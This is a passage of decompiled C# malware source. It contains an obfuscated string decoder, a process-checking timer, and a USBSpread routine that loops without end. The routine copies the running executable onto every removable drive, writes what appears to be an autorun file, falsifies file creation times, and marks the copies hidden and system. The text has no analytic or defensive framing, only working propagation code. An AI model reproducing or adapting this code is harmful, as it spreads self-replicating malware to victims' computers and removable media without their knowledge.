          Thread.Sleep(Conversions.ToInteger(Config.SleepInitival));
        this.MainTimer.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CheckProssTimer_Tick(object sender, EventArgs e)
    {
      try
      {
        CheckProcesses.Check();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void USBSpread()
    {
      while (true)
      {
        try
        {
          ListBox listBox = new ListBox();
          int index1 = 0;
          while (index1 != MyProject.Computer.FileSystem.Drives.Count)
          {
            if (MyProject.Computer.FileSystem.Drives[index1].DriveType == DriveType.Removable)
              listBox.Items.Add((object) MyProject.Computer.FileSystem.Drives[index1].ToString());
            checked { ++index1; }
          }
          int index2 = 0;
          while (index2 != listBox.Items.Count)
          {
            try
            {
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3734))));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3752))));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3778))), true);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3796))), true);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              try
              {
                System.IO.File.SetCreationTime(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3826))), DateTime.Parse(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3844)));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3886))), OpenMode.Binary);
              FileSystem.FilePut(1, LSH1IvEDia2sKbWgPr.ySdEOnZ47(3912), -1L, false);
              FileSystem.FilePut(1, LSH1IvEDia2sKbWgPr.ySdEOnZ47(3938), -1L, false);
              FileSystem.FilePut(1, LSH1IvEDia2sKbWgPr.ySdEOnZ47(3986), -1L, false);
              FileSystem.FilePut(1, LSH1IvEDia2sKbWgPr.ySdEOnZ47(4080), -1L, false);
              FileSystem.FileClose(1);
              try
              {
                MyProject.Computer.FileSystem.GetFileInfo(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(4140)))).Attributes = FileAttributes.Hidden | FileAttributes.System;
                MyProject.Computer.FileSystem.GetFileInfo(Conversions.ToString(Operators.AddObject(listBox.Items[index2], (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(4158)))).Attributes = FileAttributes.Hidden | FileAttributes.System;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index2; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
    }
  }
}
